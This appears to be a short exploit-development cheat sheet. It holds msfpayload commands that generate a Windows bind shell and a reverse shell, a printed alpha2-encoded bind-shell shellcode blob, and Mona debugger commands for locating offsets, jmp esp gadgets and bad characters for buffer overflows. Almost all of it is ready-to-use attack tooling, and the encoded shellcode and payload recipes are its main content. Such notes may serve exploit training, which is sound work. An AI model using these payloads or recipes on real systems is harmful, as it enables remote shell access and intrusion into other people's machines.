# References
tidbits and one liners

# Alpha2
```
./msfpayload win32_bind LPORT=4444 R |./alpha2 eax --unicode --uppercase
PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLRJZKPMK8L9KOKOKOQPTKRLMTO4DKPEOLDKCLKUCHM1ZOTKPOLXDK1OMPKQJKPITKP4DKM1JNNQY0DY6LTDWPBTKWY1HJLMKQI2JKZTOK0TO4NH2UJE4KQOO4KQZKS6TKLLPKTKQOMLM1JKLCNLTK3Y2LMTMLQQWSP19KS44KPCNPTKOPLLDK40ML6MTKOPKXQNS8TNPNLNZLR0KOXVQVQC361XP3NR38D7T3P2QO24KOJ0S88KJMKLOKPPKOHV1O599U1VSQZMKXKRB5QZLBKOHPQXYILIJUFM0WKO8VQC0SQCPS0SPCPSOSPSKOJ0QVQXLQQLC6R3SY9QF5C86DMJ40I7QGKOXVQZN00Q0UKOZ0RHVD6MNNYY27KOIFQCQEKOXP2HYUQ9SV191GKOYF0P0TPTPUKO8PV3QXYWD9Y6T9PWKOJ6PUKO8PS62J1TC6QXS3RM59K52JB029MYXL59JG2JPDSYYRP1WPL3FJKNORNMKN12NL5CTMSJP8VKFKVKS82RKNWCLVKO2U14KO9FQK1GR2B1PQR1RJKQPQPQ25PQKOJ0QX6M9IKUXNPSKOYFBJKOKONWKOZ04KR7KL3SWTQTKOIFR2KOZ02HL0SZM4QO0SKO9FKO8PA
```

# Hex bytes only
```
msfpayload win32_reverse LHOST=127.0.0.1 EXITFUNC=thread LPORT=1337 -b  "\x00" C | grep '"' |tr -d " " |tr -d "\n" |sed 's/[\"x;]//g'
```

# Mona
```
# Pattern create 5000 bytes
!mona pc 5000									                

# Find offet of string dj0d
!mona po dj0d									                

# Find 
!mona findmsp									                

!mona jmp -r ESP

# Stick an address in EAX when restricted by characters
!mona encode -t alphanum -s '\xa9\xfa\x12\x00'

# Generate bad characters, minus \x00
!mona bytearray -b '\x00'						          

# Compare full list of characters with output from register
!mona compare -f bytearray.bin -a 01A4F9E0		

# List all loaded modules and information about them
!mona modules									                

# Look for 'jmp esp' in essfunc.dll module
!mona find -s "\xff\xe4" -m essfunc.dll	  		

# Unicode venetian aligment stub
!mona unicodealign   # if EIP points to the start address already

# Set Mona Working Directory
!mona config -set workingfolder c:\monalogs
```
